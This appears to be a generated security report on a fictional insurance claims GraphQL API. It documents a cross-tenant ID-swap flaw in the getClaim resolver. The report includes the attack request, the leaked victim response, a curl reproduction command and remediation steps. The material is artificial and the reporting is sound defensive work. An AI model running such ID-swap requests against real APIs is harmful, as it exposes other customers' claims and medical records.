# Security Analysis Report
**System:** ClaimsFlow Underwriting API
**Domain:** Insurance / Claims Processing
**Example ID:** GQL-0262
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Single-User — Pattern 10.1 | ID swap in own request — attacker swaps `claimId` to access victim insurance claim |

---

## Finding 1 — Single-User: ID Swap in Own Request on Claim Lookup (Pattern 10.1)

### Summary
The `getClaim` GraphQL resolver on ClaimsFlow Underwriting API (`api.claimsflow-underwrit.example.com`) fetches by `claimId` without validating that the returned record belongs to the calling tenant. Per §5.0 Pattern 10.1, the attacker swaps their own `claimId` with a victim's in the request to access claim `C-2262` belonging to `tenant-dd02` while authenticated as `tenant-6950`. The resolver returns full claim data including `sensitiveField` and `internalNotes` with no authorization error. In an insurance / claims context, claim records may contain policy details, accident reports, medical records, and claimant PII.

**Pattern:** 10.1 — ID swap in own request (Single-User)
**Affected resolver:** `getClaim(id: ID!)`
**Affected endpoint:** `POST https://api.claimsflow-underwrit.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://api.claimsflow-underwrit.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
x-tenant-id: tenant-6950
Content-Type: application/json

{"query": "query VulnerableOp { getClaim(id: \"C-2262\") { claimId tenantId ownerId data { sensitiveField internalNotes } } }"}
```

**Response — Victim Claim Data Returned**
```json
{
  "data": {
    "getClaim": {
      "tenantId": "tenant-dd02",
      "ownerId": "other-user-6950dd02",
      "data": { "sensitiveField": "CONFIDENTIAL-6950dd02", "internalNotes": "Internal data exposed" }
    }
  }
}
```
Note: `x-request-id: req-6950dd02` is a server-assigned **response** header. Not part of the attack request.

### Steps to Reproduce
```bash
TOKEN="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG"
curl -s -X POST https://api.claimsflow-underwrit.example.com/graphql \
  -H "Authorization: Bearer $TOKEN" -H "x-tenant-id: tenant-6950" -H "Content-Type: application/json" \
  -d '{"query":"query VulnerableOp { getClaim(id: \"C-2262\") { claimId tenantId ownerId data { sensitiveField internalNotes } } }"}'
# Vulnerable: Returns CONFIDENTIAL-6950dd02 from tenant-dd02
# Secure: Returns FORBIDDEN — C-2262 does not belong to tenant-6950
```

### Remediation
1. `WHERE claim_id = $id AND tenant_id = $jwtTenantId` in `getClaim` resolver.
2. Post-fetch assertion: `if record.tenantId !== $jwt.tenantId → FORBIDDEN`.
3. Cache key: `claim:{tenantId}:{claimId}`.
4. **Insurance note:** Claim records contain accident reports and potentially medical records (PHI). Cross-tenant access may violate HIPAA, state insurance regulations, and data protection law.
